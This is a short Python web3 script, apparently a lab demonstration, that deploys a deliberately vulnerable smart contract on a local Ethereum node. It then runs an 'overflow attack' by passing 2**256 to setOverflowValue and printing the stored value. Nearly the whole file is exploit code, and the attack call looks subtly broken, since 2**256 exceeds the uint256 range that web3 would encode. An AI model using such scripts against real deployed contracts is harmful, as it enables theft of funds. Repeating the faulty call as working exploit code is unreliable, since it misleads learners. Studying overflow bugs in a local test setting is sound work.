from web3 import Web3
import json

# Connect to Ethereum node
w3 = Web3(Web3.HTTPProvider('http://localhost:8545'))

# Load vulnerable contract ABI and bytecode
with open('OverflowVulnerableContract.json') as f:
    contract_data = json.load(f)
vulnerable_abi = contract_data['abi']
vulnerable_bytecode = contract_data['bytecode']

# Deploy vulnerable contract
def deploy_contract(abi, bytecode):
    contract = w3.eth.contract(abi=abi, bytecode=bytecode)
    tx_hash = contract.constructor().transact()
    tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    return w3.eth.contract(address=tx_receipt.contractAddress, abi=abi)

vulnerable_contract = deploy_contract(vulnerable_abi, vulnerable_bytecode)

# Perform overflow attack
def perform_overflow_attack(vulnerable_contract):
    # Exploit the overflow vulnerability
    tx_hash = vulnerable_contract.functions.setOverflowValue(2**256).transact()
    w3.eth.wait_for_transaction_receipt(tx_hash)
    
    # Check the result
    result = vulnerable_contract.functions.getValue().call()
    print(f"Overflow Result: {result}")

perform_overflow_attack(vulnerable_contract)
